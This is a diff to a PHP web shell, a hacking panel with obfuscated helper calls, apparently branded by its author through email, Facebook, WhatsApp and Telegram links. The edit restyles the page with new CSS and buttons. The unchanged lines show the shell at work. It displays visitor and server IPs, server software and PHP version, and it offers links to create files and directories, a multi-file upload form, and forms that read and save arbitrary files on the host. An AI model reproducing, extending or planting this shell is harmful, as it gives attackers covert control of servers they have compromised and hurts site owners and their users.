@@ -181,9 +181,9 @@ function tF($yf)
 <style>
 .d-flex {
     display: flex !important;
-    justify-content: space-evenly;
+    justify-content: center;
     align-content: center;
-    align-items: flex-start;
+    align-items: center;
 }
 .fa-fw {
 width: 1.28571429em;
@@ -191,49 +191,102 @@ text-align: center;
 color: lime;
 }
 </style>
+<style>
+body {
+    margin: 0;
+    font-family: 'Kelly Slab', cursive;
+    font-weight: 400;
+    line-height: 1.5;
+    text-align: left;
+    height: 100vh;
+    margin-left: auto;
+    margin-right: auto;
+    width: 99%;
+    font-size: 17px;
+    background-color: black;
+    color: white;
+}
+.border {
+    border: 2px solid #ff1493;
+    margin-top: 0.25rem !important;
+    margin-bottom: 0.25rem !important;
+}
+.btn-outline-light {
+    background: black;
+    padding-left: 10px;
+    padding-right: 10px;
+    padding-top: 3px;
+    padding-bottom: 3px;
+    color: white;
+    border: 2px solid #ff1493;
+    border-radius: 5px;
+    font-size: 17px;
+    font-family: 'Kelly Slab', cursive;
+}
+.btn-outline-light:hover {
+border: 2px solid #ff1493;
+font-size: 17px;
+color: lime;
+}
+input[type=file]:hover {
+    color: lime;
+}
+input[type=submit] {
+    background: black;
+    color: white;
+    border: 2px solid #ff1493;
+    border-radius: 5px;
+    font-size: 16px;
+    font-family: 'Kelly Slab', cursive;
+    padding-left: 10px;
+    padding-right: 10px;
+    padding-top: 3px;
+    padding-bottom: 3px;
+}
+input[type=submit]:hover {
+color: lime;
+}
+</style>
 </head>
-<body style="margin-left:auto;margin-right:auto;width: 99%;font-size: 17px;background-color: black;color:white;">
- <div class="bg-dark border mt-2">
-  <div class="social container">
+<body>
+ <div class="border">
    <div class="d-flex">
   <a class="border social-icon" data-tooltip="Email" href="mailto:combetohct@yahoo.com">
     <i class="fa fa-envelope" aria-hidden="true" style="font-size: 17px;"></i>
-  </a>
+  </a>&nbsp;
   <a class="border social-icon" data-tooltip="Facebook" href="https://www.facebook.com/combet.ohct">
     <i class="fa fa-facebook" aria-hidden="true" style="font-size: 17px;"></i>
-  </a>
+  </a>&nbsp;
       <div class="combetohct">
        <a href="?" style="font-size:25px;font-family: 'SciFi';">
        <?= Yp ?>
-       </a>
+       </a>&nbsp;
       </div>
          <a class="border social-icon" data-tooltip="WhatsApp" href="https://wa.me/6281270303335">
     <i class="fa fa-whatsapp" aria-hidden="true" style="font-size: 20px;"></i>
-  </a>
+  </a>&nbsp;
   <a class="border social-icon" data-tooltip="Telegram" href="https://t.me/combetohct">
     <i class="fa fa-telegram" aria-hidden="true" style="font-size: 17px;"></i>
   </a>
   </div>
   </div>
- </div>
  <div class="bg-dark border mt-2">
       <span class="mb-1 px-1 mt-1"><font color="white"> Your Ip : </font><font color="lime"><?php echo $_SERVER['REMOTE_ADDR']; ?></font></span><br>
    <span class="mb-1 px-1 mt-1"><font color="white"> Server Ip : </font><font color="lime"><?php echo $_SERVER['SERVER_ADDR']; ?></font></span><br>
-   <span class="mb-1 px-1 mt-1"><font color="white"> Sserver : </font><font color="lime"><?= $c8[0]() ?></font></span><br>
+   <span class="mb-1 px-1 mt-1"><font color="white"> Server : </font><font color="lime"><?= $c8[0]() ?></font></span><br>
    <span class="mb-1 px-1 mt-1"><font color="white"> Server Software : </font><font color="lime"><?php echo gethostbyname($_SERVER['SERVER_SOFTWARE']); ?></font></span><br>
    <span class="mb-1 px-1 mt-1"><font color="white"> Server Name : </font><font color="lime"><?php echo $_SERVER['SERVER_NAME']; ?></font></span><br>
    <span class="mb-1 px-1 mt-1"><font color="white"> PHP Version : </font><font color="lime"><?= $c8[1]() ?></font></span>
 <div class="mb-1 px-1 mt-99">
-  <font color="white"> Add File : </font><span style="margin:2px;padding:3px;height:27px;background:black;color: lime;border:2px solid lime;border-radius:5px;">
-       <a href="?p=<?= ss($Jd) . "&a=" . Ss("newFile") ?>" class="ml-99"> Submit </a>
-     </span></div>
-<div class="mb-1 px-1 mt-99">
-   <font color="white"> Add Directory : </font><span style="margin:2px;padding:3px;height:27px;background:black;color: lime;border:2px solid lime;border-radius:5px;">
-       <a href="?p=<?= Ss($Jd) . "&a=" . sS("newDir") ?>" class="ml-99"> Submit </a>
-     </span>
+  <font color="white"> Add File : </font>
+       <a href="?p=<?= ss($Jd) . "&a=" . Ss("newFile") ?>" class="btn-outline-light"> Submit </a>
 </div>
+<div class="mb-1 px-1 mt-99">
+   <font color="white"> Add Directory : </font>
+       <a href="?p=<?= Ss($Jd) . "&a=" . sS("newDir") ?>" class="btn-outline-light"> Submit </a>
+</div>
+<div class="mb-1 px-1 mt-1">
     <form method="post" enctype="multipart/form-data"> 
-     <div class="mb-1 px-1 mt-1">
        <input type='file' name='f[]'>
         <input type='submit' value='Upload' name='upload'>
         </form>
@@ -434,7 +487,7 @@ Lw:
 ) ?>">
 </div>
 <center><div class="form-group mt-2">
-<button type="submit" name="s" class="btn btn-outline-light">Save
+<button type="submit" name="s" class="btn btn-outline-light">Submit
 </button>
 </div></center>
 </form>
@@ -456,7 +509,7 @@ Ox:
 <?= $c8[18]($c8[14]($Jd . "/" . jD($_GET["n"]))) ?></textarea>
 </div>
 <center><div class="form-group mt-2">
-<button type="submit" name="s" class="btn btn-outline-light">Save
+<button type="submit" name="s" class="btn btn-outline-light">Submit
 </button>
 </div></center>
 </form>
